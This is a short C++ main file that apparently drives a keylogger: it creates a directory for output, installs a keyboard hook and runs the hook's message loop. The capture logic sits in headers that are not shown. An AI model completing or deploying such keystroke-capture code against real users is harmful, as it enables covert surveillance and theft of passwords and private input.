#include "stream.h"
#include "keyhook.h"
int main() {
  stream::MakeDir(stream::GetPath());
  key_hook::InstallHook();
  key_hook::HandleMessage(true);

  return 0;
}
